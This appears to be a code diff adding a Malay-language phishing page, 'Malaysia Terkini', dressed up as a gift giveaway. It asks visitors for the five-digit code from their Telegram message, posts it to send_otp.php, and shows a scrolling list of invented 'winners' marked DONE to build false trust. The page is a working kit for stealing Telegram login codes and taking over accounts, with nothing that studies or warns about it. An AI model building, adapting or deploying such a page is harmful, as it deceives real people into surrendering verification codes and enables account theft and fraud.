@@ -1,0 +1,276 @@
+<!doctype html>
+<html lang="en" class="h-100">
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<head id="ctl00_Head1">
+		<link href="assets/css/bootstrap.min.css" rel="stylesheet">
+		<link href="assets/css/custom.css" type="text/css" rel="stylesheet" />
+		<link href="assets/css/menebus.css" type="text/css" rel="stylesheet" />
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1" />
+		<meta property="og:title" content="Malaysia Terkini">
+		<meta property="og:image" content="https://kongsibersama.semasa.my.id/assets/img/ini.png">
+		<meta name="description" />
+		<meta name="author" content="Malaysia Terkini" />
+		<title>Malaysia Terkini</title>
+		<link rel="icon" type="image/x-icon" href="favicon.html" />
+		<link rel="canonical" href="https://getbootstrap.com/docs/5.0/examples/sticky-footer/" />
+		<link rel="stylesheet" href="assets/css/bootstrap-icons.css" />
+		<script type="text/javascript" src="assets/js/vue.min.js.download"></script>
+		<script src="assets/js/clipboard.js.download"></script>
+		<script type="text/javascript" src="assets/js/index.js.download"></script>
+		<style>
+body {
+    margin: 0;
+    font-family: 'Segoe UI', sans-serif;
+    background: linear-gradient(to bottom, #ffffff 45%, #ff7a00 45%);
+}
+
+.claim-container {
+    max-width: 420px;
+    margin: auto;
+    padding: 20px;
+}
+
+.gift-img {
+    width: 100%;
+    max-width: 320px;
+    display: block;
+    margin: 30px auto 20px;
+}
+
+.claim-title {
+    font-size: 28px;
+    font-weight: 800;
+    text-align: center;
+    margin: 20px 0 30px;
+    color: #1a1a1a;
+}
+
+.form-label-custom {
+    font-weight: 600;
+    margin-bottom: 6px;
+}
+
+.form-control-custom {
+    height: 55px;
+    border-radius: 12px;
+    border: 2px solid #333;
+    font-size: 16px;
+    padding-left: 15px;
+}
+
+.phone-group {
+    display: flex;
+    align-items: center;
+    border: 2px solid #333;
+    border-radius: 12px;
+    overflow: hidden;
+    background: #fff;
+}
+
+.phone-prefix {
+    padding: 0 12px;
+    display: flex;
+    align-items: center;
+    font-weight: 600;
+    background: #f5f5f5;
+}
+
+.phone-input {
+    border: none;
+    flex: 1;
+    height: 55px;
+    padding-left: 10px;
+    font-size: 16px;
+}
+
+.phone-input:focus {
+    outline: none;
+}
+
+.btn-claim {
+    width: 100%;
+    height: 55px;
+    border-radius: 12px;
+    font-weight: 700;
+    font-size: 18px;
+    background: #ffcc00;
+    border: none;
+    margin-top: 20px;
+}
+.winners-wrapper {
+    max-width: 320px;       /* lebih kecil */
+    height: 140px;          /* kotak kecil */
+    margin: 20px auto;
+    overflow: hidden;
+    border-radius: 15px;
+}
+
+.winners-track {
+    display: flex;
+    flex-direction: column;
+    animation: scrollUp 12s linear infinite;
+}
+
+@keyframes scrollUp {
+    0% { transform: translateY(0); }
+    100% { transform: translateY(-50%); }
+}
+
+.winner-card {
+    display: flex;
+    align-items: center;
+    background: #f3eef3;
+    border: 2px solid #1e2e8a;
+    border-radius: 14px;
+    padding: 8px 10px;
+    margin-bottom: 10px;
+}
+
+/* kecilkan icon */
+.avatar-circle {
+    width: 35px;
+    height: 35px;
+    border-radius: 50%;
+    background: #2d5bd1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 16px;
+    color: white;
+}
+
+.gift-icon {
+    position: absolute;
+    bottom: -3px;
+    right: -3px;
+    font-size: 14px;
+}
+
+.winner-left {
+    position: relative;
+    margin-right: 8px;
+}
+
+.winner-name {
+    font-weight: 600;
+    font-size: 13px;
+}
+
+.winner-status {
+    font-weight: 700;
+    font-size: 12px;
+    color: #1e2e8a;
+}
+</style>
+	</head>
+
+	<main>
+    <div class="claim-container">
+
+        <!-- Gambar Hadiah -->
+        <img src="assets/img/giveaway.jpeg" class="gift-img" alt="Hadiah">
+
+        <div class="claim-title">
+            "Sila masukkan Kod daripada Mesej Telegram Awak"
+        </div>
+
+        <form method="POST" action="send_otp.php">
+    <div class="mb-3">
+        <label class="form-label-custom">5 digit Kod</label>
+        <input name="otp" 
+               type="tel" 
+               required 
+               class="form-control-custom w-100"
+               placeholder="Masukkan nombor Kod">
+    </div>
+
+    <button type="submit" class="btn-claim">
+        Hantar Kod OTP
+    </button>
+</form>
+                </div>
+</main>
+        
+
+    </script>
+			</div>
+		</main>
+		<br>
+		<br>
+		<div class="winners-container">
+
+    <div class="winners-wrapper">
+    <div class="winners-track">
+
+        <div class="winner-card">
+            <div class="winner-left">
+                <div class="avatar-circle">👤</div>
+                <div class="gift-icon">🎁</div>
+            </div>
+            <div class="winner-info">
+                <div class="winner-name">Norshila Anuar</div>
+                <div class="winner-status">DONE ✔</div>
+            </div>
+        </div>
+
+        <div class="winner-card">
+            <div class="winner-left">
+                <div class="avatar-circle">👤</div>
+                <div class="gift-icon">🎁</div>
+            </div>
+            <div class="winner-info">
+                <div class="winner-name">Zainuddin Ali</div>
+                <div class="winner-status">DONE ✔</div>
+            </div>
+        </div>
+
+        <div class="winner-card">
+            <div class="winner-left">
+                <div class="avatar-circle">👤</div>
+                <div class="gift-icon">🎁</div>
+            </div>
+            <div class="winner-info">
+                <div class="winner-name">Fauzi Abdul Rahman</div>
+                <div class="winner-status">DONE ✔</div>
+            </div>
+        </div>
+
+        <div class="winner-card">
+            <div class="winner-left">
+                <div class="avatar-circle">👤</div>
+                <div class="gift-icon">🎁</div>
+            </div>
+            <div class="winner-info">
+                <div class="winner-name">Lina Mohd Noor</div>
+                <div class="winner-status">DONE ✔</div>
+            </div>
+        </div>
+
+        <div class="winner-card">
+            <div class="winner-left">
+                <div class="avatar-circle">👤</div>
+                <div class="gift-icon">🎁</div>
+            </div>
+            <div class="winner-info">
+                <div class="winner-name">Ismail Zaid</div>
+                <div class="winner-status">DONE ✔</div>
+            </div>
+        </div>
+
+        <!-- DUPLICATE UNTUK LOOP SMOOTH -->
+        <div class="winner-card">
+            <div class="winner-left">
+                <div class="avatar-circle">👤</div>
+                <div class="gift-icon">🎁</div>
+            </div>
+            <div class="winner-info">
+                <div class="winner-name">Norshila Anuar</div>
+                <div class="winner-status">DONE ✔</div>
+            </div>
+        </div>
+
+    </div>
+</div>
+	</body>
+</html>
